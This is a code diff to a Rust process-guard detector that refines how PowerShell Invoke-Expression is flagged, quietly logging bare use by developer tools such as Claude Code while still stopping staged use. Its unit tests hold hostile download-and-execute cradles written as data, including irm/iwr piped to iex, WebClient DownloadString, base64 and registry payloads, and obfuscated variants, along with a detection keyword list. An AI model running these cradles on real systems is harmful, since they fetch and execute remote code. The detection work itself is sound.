@@ -52,14 +52,47 @@ pub const LOTL_PATTERNS: &[&str] = &[
     "certutil -urlcache",
 ];
 
+/// `Invoke-Expression` with nothing that says where its text comes from. Developer tools start
+/// PowerShell this way (Claude Code runs every command so), and `iex` is also Elixir's shell.
+pub const INVOKE_ONLY: &str = "invoke-expression on its own";
+
+/// What makes `Invoke-Expression` a stager: its text is fetched, decoded, put together from
+/// pieces or read from the registry.
+const INVOKE_PAYLOADS: &[&str] = &[
+    "http:",
+    "https:",
+    "net.webclient",
+    "download",
+    "bitstransfer",
+    "invoke-webrequest",
+    "invoke-restmethod",
+    "iwr ",
+    "irm ",
+    "curl ",
+    "wget ",
+    "base64",
+    "gzipstream",
+    "deflatestream",
+    "hkcu:",
+    "hklm:",
+    "get-itemproperty",
+    "[char",
+    "-join",
+    "-bxor",
+];
+
 /// Returns the first suspicious pattern for a script host, matching case- and
-/// whitespace-insensitively with quote/caret obfuscation stripped.
+/// whitespace-insensitively with quote/caret/backtick obfuscation stripped. `Invoke-Expression`
+/// needs a second sign (`INVOKE_PAYLOADS`, or any other pattern) to be more than `INVOKE_ONLY`.
 pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
     let name = process_name.to_ascii_lowercase();
     if !LOTL_PROCESSES.contains(&name.as_str()) {
         return None;
     }
-    let stripped: String = cmdline.chars().filter(|c| *c != '"' && *c != '^').collect();
+    let stripped: String = cmdline
+        .chars()
+        .filter(|c| !matches!(c, '"' | '^' | '`'))
+        .collect();
     let mut normalized = stripped
         .split_whitespace()
         .collect::<Vec<_>>()
@@ -67,10 +100,16 @@ pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
         .to_lowercase()
         .replace("certutil.exe ", "certutil ");
     normalized.push(' ');
-    LOTL_PATTERNS
+    let is_invoke = |pattern: &str| matches!(pattern, "invoke-expression" | "iex " | "iex(");
+    let mut found = LOTL_PATTERNS
         .iter()
         .copied()
-        .find(|pattern| normalized.contains(pattern))
+        .filter(|pattern| normalized.contains(pattern));
+    let first = found.next()?;
+    let conclusive = !is_invoke(first)
+        || found.any(|other| !is_invoke(other))
+        || INVOKE_PAYLOADS.iter().any(|p| normalized.contains(p));
+    Some(if conclusive { first } else { INVOKE_ONLY })
 }
 
 pub const MACOS_LOTL_PROCESSES: &[&str] = &["zsh", "bash", "sh", "osascript", "curl", "python3"];
@@ -95,7 +134,7 @@ pub const OSASCRIPT_SHELL_MENTION: &str = "shell command line mentioning osascri
 
 /// Patterns that raise an alert but never terminate the process.
 pub fn is_alert_only(pattern: &str) -> bool {
-    pattern == OSASCRIPT_SHELL_MENTION
+    matches!(pattern, OSASCRIPT_SHELL_MENTION | INVOKE_ONLY)
 }
 
 /// What malware does with inline AppleScript. A bare `osascript -e` is not a signal: launchers,
@@ -581,20 +620,20 @@ impl ProcessGuard {
         } else {
             "TERMINATE_FAILED".to_string()
         };
-        quarantine::record_event(
-            &self.cfg,
-            ThreatEvent::new(
-                "LOTL_SCRIPT",
-                Severity::High,
-                format!("{name} (pid {})", pid.as_u32()),
-                action,
-                format!(
-                    "pattern=\"{}\" cmdline=\"{}\"",
-                    pattern.trim(),
-                    quarantine::truncate_chars(cmdline, CMDLINE_LOG_LIMIT)
-                ),
+        let mut event = ThreatEvent::new(
+            "LOTL_SCRIPT",
+            Severity::High,
+            format!("{name} (pid {})", pid.as_u32()),
+            action,
+            format!(
+                "pattern=\"{}\" cmdline=\"{}\"",
+                pattern.trim(),
+                quarantine::truncate_chars(cmdline, CMDLINE_LOG_LIMIT)
             ),
         );
+        // A developer tool may do this many times a minute: kept in the log, no notification.
+        event.quiet = pattern == INVOKE_ONLY;
+        quarantine::record_event(&self.cfg, event);
     }
 
     fn is_trusted(&mut self, exe: &Path) -> bool {
@@ -839,6 +878,41 @@ mod tests {
         )
         .is_some());
         assert!(match_lotl("powershell.exe", "powershell -c iex").is_some());
+    }
+
+    /// How Claude Code starts PowerShell on Windows, copied from a running one.
+    const CLAUDE_CODE: &str = r#""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript""#;
+
+    #[test]
+    fn invoke_expression_alone_is_recorded_and_never_stopped() {
+        for (name, line) in [
+            ("powershell.exe", CLAUDE_CODE),
+            ("cmd.exe", CLAUDE_CODE),
+            ("powershell.exe", "powershell -c iex"),
+            ("cmd.exe", "cmd /c iex -S mix"),
+        ] {
+            let found = match_lotl(name, line).expect(line);
+            assert!(is_alert_only(found), "{line}: {found}");
+        }
+    }
+
+    #[test]
+    fn invoke_expression_on_something_fetched_or_decoded_is_stopped() {
+        for line in [
+            "powershell -c \"irm https://x.example/a.ps1 | iex\"",
+            "powershell -c \"iwr http://x/a.ps1 -useb | iex\"",
+            "powershell iex (New-Object Net.WebClient).DownloadString('http://x/a.ps1')",
+            "powershell Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))",
+            "powershell iex (Get-ItemProperty HKCU:\\Software\\x).p",
+            "powershell iex (gp HKCU:\\Software\\x).p",
+            "powershell iex (([char]73+[char]69) -join '')",
+            "powershell -w hidden -c iex $p",
+            "powershell -ep bypass -c iex $p",
+            "powershell -c \"i`ex (i`rm http://x/a.ps1)\"",
+        ] {
+            let found = match_lotl("powershell.exe", line).expect(line);
+            assert!(!is_alert_only(found), "{line}: {found}");
+        }
     }
 
     #[test]
